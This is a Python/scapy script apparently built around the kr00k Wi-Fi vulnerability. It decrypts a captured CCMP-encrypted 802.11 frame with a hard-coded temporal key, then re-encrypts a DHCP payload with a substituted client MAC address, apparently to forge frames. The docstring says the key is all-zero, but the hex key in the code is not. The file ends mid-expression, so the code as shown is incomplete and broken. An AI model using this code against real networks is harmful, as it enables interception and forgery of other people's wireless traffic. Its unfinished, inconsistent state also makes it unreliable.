#!/usr/bin/python3
# -*- coding: utf-8 -*-​
import sys, os, time, re, argparse, logging
logging.getLogger("scapy.runtime").setLevel(logging.ERROR)
from scapy.all import *
from scapy.sendrecv import sniff, sendp
from scapy.layers.dot11 import Dot11, RadioTap, Dot11CCMP, Dot11FCS
from Crypto.Cipher import AES
from subprocess import run, PIPE



def decrypt(pkt):
    """
    try to decrypt traffic using all-zero tk
    """
    try:

        addr1 = re.sub(":","",pkt.addr1)
        addr2 = re.sub(":","",pkt.addr2)
        addr3 = re.sub(":","",pkt.addr3)
        #print(pkt.addr2)
        # addr4 = re.sub(":","",fcs.addr4)
        PN = "{:02x}{:02x}{:02x}{:02x}{:02x}{:02x}".format(pkt.PN5,pkt.PN4,pkt.PN3,pkt.PN2,pkt.PN1,pkt.PN0)
        # Priority Octet "00" 
        nonce = bytes.fromhex("00") + bytes.fromhex(addr2) + bytes.fromhex(PN)               
        TK = bytes.fromhex("66d1e91332d4735b4e7784804845161b") #TK
        print("密文 : ", pkt.data.hex())
        # cipher_text = pkt.data[:-8]
        cipher_text = pkt.data
        print("cipher_text : ", cipher_text.hex())
        
        # 真正解密过程
        cipher = AES.new(TK, AES.MODE_CCM, nonce, mac_len=8)
        cipher2 = AES.new(TK, AES.MODE_CCM, nonce, mac_len=8)
        # cipher.update(AAD)
        plain_text = cipher.decrypt(cipher_text)
        
        p2 = LLC(plain_text)
        p2.show()
        print("明文 : ", plain_text.hex())            # 解密后明文
        
        
        mingwen = "aaaa0300000008004500015ac10500008011788e00000000ffffffff0044004301462d5c01010600ccbfab040000000000000000000000000000000000000000e4029b5cfefe00000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000638253633501033d0701e4029b5cfefe3204c0a804770c0d62696368656e7368616f2d7063511000000062696368656e7368616f2d70633c084d53465420352e30370e0103060f1f212b2c2e2f7779f9fcffe818890fb7a5a580"
        mac_client = "001d4320192d"
        msg = mingwen.replace("e4029b5cfefe", mac_client)
        miwen = cipher2.encrypt(bytes.fromhex(msg))
        print("再加密密文 ： ", miwen.hex())
        # assert plain_text.startswith(b'\xaa\xaa\x03'), "All-0 TK failed to decrypt"
        # eth_header = bytes.fromhex(addr3 + addr2) + plain_text[6:8]
        # packet = eth_header + plain_text[8:]

        # if station.lower() == pkt.addr2:
        #     print('kr00k PACKET ARRIVED FROM THE STATION!')
        # elif bssid.lower() == pkt.addr2:
        #     print('kr00k PACKET ARRIVED FROM THE AP!')
        # else:
        #     print('kr00k PACKET ARRIVED!')

        # if filename:
        #     wrpcap(filename + ".decrypted", packet, append=True)
        #     wrpcap(filename + ".encrypted", pkt, append=True)

    except AssertionError:
        pass
        # print('All-0 TK failed to decrypt this CCMP packet')
        
    return miwen.hex()


intfmon = 'mon0'
workdir = '/tmp'
filename = workdir + '/' + 'kr00k.pcap'
station = '00:11:22:33:44:55'
bssid = '55:44:33:22:11:00'
p = "000012002e480000006c8509c000e901000088412c005a41201d26ede4029b5cfefeffffffffffff2000000001000020000000005819d47039608d9c555ddc5ae35c37034773523ec9ad11f860d2133b264eab5fee110170735e028a3699f8dfd7ca1ee9ded194061a349e27f8a2f440b33390fef91dbcfc5cd5c0026bc56619bf0fabb5caca401ebdc2444fcba7dad84ca159351e894f3cdab94b4a2ca831ef098bc0279d60d0739ed9792f53ec9607ff1f51eff788cf4736cc62c6fdadf401dab141d0262cbe14d6d76de4f74d7058a88643b4ab48f9d917bc666ad94bccf66b171cb6b68e0ec215eb6445d44e49a4ae4767278c12238e3a92577c505ad2b50b4fbd59d305989277e190d86b4c585ebfe9e4fa24bb635bb72854828aff56787baab8e86f2f7beab36bc204dd28beca6a53c6430f393878d0aa54fc869dcc00e05b3e3191965ab84cc9c96d61a550678dd2e9358921c21ec48d1159b02b6fc9e53188113afcdf003017211f0f4d0f18abbe2c246539e123bae49ef6a1d7af0257177456d0ccc25aebba0508580c07a5404ec30918d40a790191284fd387"
packet = RadioTap(bytes.fromhex(p))[Dot11]
# print("Packet : ", packet)
packet.show()


e = decrypt(packet)
# packet
new_p = RadioTap() / Dot11() / 